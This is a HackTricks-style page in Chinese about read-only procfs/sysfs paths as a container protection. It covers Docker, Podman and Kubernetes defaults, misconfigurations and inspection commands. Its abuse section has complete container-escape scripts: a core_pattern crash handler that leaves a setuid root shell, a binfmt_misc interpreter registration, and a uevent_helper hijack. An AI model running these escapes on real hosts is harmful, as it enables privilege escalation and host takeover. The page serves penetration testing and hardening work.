# 只读系统路径

{{#include ../../../../banners/hacktricks-training.md}}

只读系统路径是区别于 masked paths 的另一种保护机制。它不会完全隐藏某个路径，而是向 runtime 暴露该路径，但将其以只读方式挂载。这在选定的 procfs 和 sysfs 位置中很常见：读取权限可能是可接受的，或在运行过程中确有必要，但写入权限则过于危险。

其目的很直接：许多内核接口在可写时会变得更加危险。只读挂载不会消除所有侦察价值，但可以阻止已被攻陷的 workload 通过该路径修改底层的内核接口文件。

## 操作

runtime 通常会将 proc/sys 视图中的部分内容标记为只读。根据 runtime 和主机的不同，可能包括以下路径：

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

实际列表会有所不同，但其模型相同：在需要时允许查看，默认拒绝修改。

## 实验

检查 Docker 声明的只读路径列表：
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
从容器内部检查已挂载的 proc/sys 视图：
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## 安全影响

只读系统路径可以限制大量影响 host 的滥用方式。即使 attacker 能够检查 procfs 或 sysfs，无法向其中写入也会移除许多直接修改路径，包括 kernel tunables、crash handlers、module-loading helpers 以及其他 control interfaces。风险并未消失，但从 information disclosure 发展到影响 host 会变得更加困难。

## 错误配置

主要错误包括：取消敏感路径的 mask、将其重新挂载为 read-write、通过可写的 bind mounts 直接暴露 host 的 proc/sys 内容，或使用实际上绕过更安全 runtime 默认设置的 privileged 模式。在 Kubernetes 中，`procMount: Unmasked` 和 privileged workloads 往往与较弱的 proc protection 同时出现。另一个常见的 operational 错误是认为，由于 runtime 通常会以 read-only 方式挂载这些路径，因此所有 workloads 都会继承这一默认设置。

## 滥用

如果 protection 较弱，可以先查找可写的 proc/sys entries：
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
当存在可写条目时，高价值的后续路径包括：
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
这些命令可以揭示：

- `/proc/sys` 下可写的条目通常意味着 container 可以修改 host 的 kernel 行为，而不仅仅是进行检查。
- `core_pattern` 尤其重要，因为可写的、面向 host 的值可以在设置 pipe handler 后，通过让进程崩溃转化为 host code execution 路径。
- `modprobe` 可以揭示 kernel 在与 module-loading 相关的流程中使用的 helper；当它可写时，这是一个经典的高价值目标。
- `binfmt_misc` 可以告诉你是否能够注册自定义 interpreter。如果注册权限可写，它就可能成为 execution primitive，而不只是 information leak。
- `panic_on_oom` 控制 host 范围的 kernel 决策，因此可能将资源耗尽转化为 host denial of service。
- `uevent_helper` 是可写 sysfs helper path 产生 host-context execution 的最明显示例之一。

值得关注的发现包括：本应为 read-only、但实际上可写的面向 host 的 proc knobs 或 sysfs entries。此时，workload 已经从受限的 container 视图，转向对 kernel 产生实际影响。

### 完整示例：`core_pattern` Host Escape

如果 container 内的 `/proc/sys/kernel/core_pattern` 可写，并且指向 host kernel 视图，则可以在 crash 后滥用它来执行 payload：
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
如果该路径确实能够到达 host kernel，payload 会在 host 上运行，并留下一个 setuid shell。

### 完整示例：`binfmt_misc` 注册

如果 `/proc/sys/fs/binfmt_misc/register` 可写，则自定义 interpreter 注册可以在执行匹配文件时实现代码执行：
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
在面向 host 且可写的 `binfmt_misc` 上，结果是在由 kernel 触发的 interpreter 路径中实现 code execution。

### 完整示例：`uevent_helper`

如果 `/sys/kernel/uevent_helper` 可写，kernel 可能会在触发匹配事件时调用一个 host-path helper：
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
之所以如此危险，是因为 helper path 是从 host filesystem 的视角解析的，而不是从安全的、仅限 container 的上下文中解析的。

## 检查

这些检查用于确定 procfs/sysfs 暴露是否在预期情况下为只读，以及 workload 是否仍然能够修改敏感的 kernel interfaces。
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
这里有哪些值得关注的地方：

- 一个正常加固的 workload 通常只应暴露极少数可写的 proc/sys 条目。
- 可写的 `/proc/sys` 路径通常比普通的读取权限更值得关注。
- 如果 runtime 声称某个路径是只读的，但实际上可以写入，应仔细检查 mount propagation、bind mounts 和 privilege 设置。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 默认启用 | Docker 会为敏感的 proc 条目定义默认只读路径列表 | 暴露 host proc/sys mounts、`--privileged` |
| Podman | 默认启用 | Podman 会应用默认只读路径，除非明确放宽限制 | `--security-opt unmask=ALL`、广泛的 host mounts、`--privileged` |
| Kubernetes | 继承 runtime defaults | 使用底层 runtime 的只读路径模型，除非通过 Pod 设置或 host mounts 放宽限制 | `procMount: Unmasked`、privileged workloads、可写的 host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Runtime default | 通常依赖 OCI/runtime defaults | 与 Kubernetes 行相同；直接修改 runtime 配置可能削弱该行为 |

关键点在于，只读系统路径通常作为 runtime default 存在，但 privileged modes 或 host bind mounts 很容易削弱这一保护。
{{#include ../../../../banners/hacktricks-training.md}}
